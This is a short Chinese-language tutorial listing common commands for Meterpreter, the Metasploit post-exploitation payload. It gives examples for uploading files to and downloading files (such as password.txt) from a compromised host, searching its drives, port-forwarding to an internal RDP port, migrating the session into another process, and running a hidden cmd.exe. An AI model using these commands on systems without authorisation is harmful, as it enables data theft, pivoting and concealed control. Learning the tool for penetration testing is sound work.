## 一、介绍

```php
	在Metasploit Framework中，Meterpreter是一款后渗透工具，属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具基于"内存DLL注入"理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。
```



## 二、常用命令

### 1、getwd

```php
# 解释
	可以获取当前目标机器的工作目录，也可以获取当前系统的工作目录。
```

```php
# 实例
	getwd
	getlwd
```

### 2、upload

```php
# 解释
	可以上传文件或文件夹到目标机器。
```

```php
# 实例
	upload /root/tcp_client.py d:\\
```

### 3、download

```php
# 解释
	从目标机器上下载文件夹或者文件到攻击机。
```

```php
# 实例
	download password.txt /root
```

### 4、search

```php
# 解释
	支持对远程目标机器上的文件进行搜索。
```

```php
# 实例
	search -d d:\\ -r false -f *.txt
```

### 5、portfwd

```php
# 解释
	meterpreter内嵌的端口转发器，一般在目标主机开放的端口不允许直接访问的情况下使用；比如当目标主机开放的远程桌面3389端口只允许内网访问，这时可以使用portfwd命令进行端口转发，以达到直接访问目标主机的目的。
```

```php
# 实例
	portfwd add -l 1234 -r 192.168.174.138 -p 3389
```

### 6、route

```php
# 解释
	查看路由
```

### 7、ps

```php
# 解释
	获取目标主机上正在运行的进程信息。
```

### 8、migrate

```php
# 解释
	将当前meterpreter会话从一个进程移植到另外一个进程的内存空间中
```

```php
# 实例
	migrate 11111
```

### 9、execute

```php
# 解释
	可以在目标中执行文件
```

```php
# 实例
	execute -H -i -f cmd.exe
```

